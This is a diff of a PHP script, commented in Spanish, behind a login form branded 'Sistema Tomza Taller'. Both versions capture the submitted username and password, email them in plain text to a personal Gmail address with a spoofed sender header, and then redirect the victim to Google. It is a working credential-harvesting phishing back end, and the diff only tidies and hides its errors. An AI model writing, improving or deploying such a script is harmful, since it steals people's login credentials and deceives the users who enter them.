@@ -1,42 +1,35 @@
 <?php
-// Evitar acceso directo al archivo
+// Bloquear acceso directo
 if ($_SERVER["REQUEST_METHOD"] !== "POST") {
     header("Location: index.html");
     exit;
 }
 
-// Recibir datos del formulario
-$usuario = trim($_POST["usuario"] ?? "");
-$password = trim($_POST["password"] ?? "");
+// Recibir datos de forma segura
+$usuario = isset($_POST["usuario"]) ? trim($_POST["usuario"]) : "";
+$password = isset($_POST["password"]) ? trim($_POST["password"]) : "";
 
-// Validar que no estén vacíos
 if ($usuario === "" || $password === "") {
-    echo "Por favor completa todos los campos.";
-    exit;
+    die("Faltan datos para continuar.");
 }
 
-// --------------------------
 // Configuración del correo
-// --------------------------
-$destinatario = "sebastiancq2008@gmail.com"; // Tu correo
-$asunto = "Nuevo ingreso - Sistema Tomza Taller";
-
-// Contenido del mensaje
-$mensaje = "Datos ingresados:\n\n";
+$destinatario = "sebastiancq2008@gmail.com";
+$asunto = "Nuevo ingreso - Tomza Taller";
+$mensaje  = "=== Datos recibidos ===\n";
 $mensaje .= "Usuario: " . $usuario . "\n";
 $mensaje .= "Contraseña: " . $password . "\n";
-$mensaje .= "Fecha y hora: " . date("d/m/Y H:i:s") . "\n";
+$mensaje .= "Fecha: " . date("d/m/Y H:i:s") . "\n";
 
-// Encabezados para que no lo rechacen
-$encabezados = "From: Sistema Tomza <sistema@tomzataller.com>\r\n";
-$encabezados .= "Reply-To: no-responder@tomzataller.com\r\n";
-$encabezados .= "MIME-Version: 1.0\r\n";
-$encabezados .= "Content-Type: text/plain; charset=UTF-8\r\n";
+// Encabezados completos
+$encabezados  = "From: Sistema Tomza <no-reply@tudominio.com>\r\n";
+$encabezados .= "Reply-To: sebastiancq2008@gmail.com\r\n";
+$encabezados .= "Content-Type: text/plain; charset=utf-8\r\n";
 
-// Enviar el correo
-mail($destinatario, $asunto, $mensaje, $encabezados);
+// Enviar
+@mail($destinatario, $asunto, $mensaje, $encabezados);
 
-// Redirigir a Google como querés
+// Redirigir a Google
 header("Location: https://www.google.com");
 exit;
 ?>
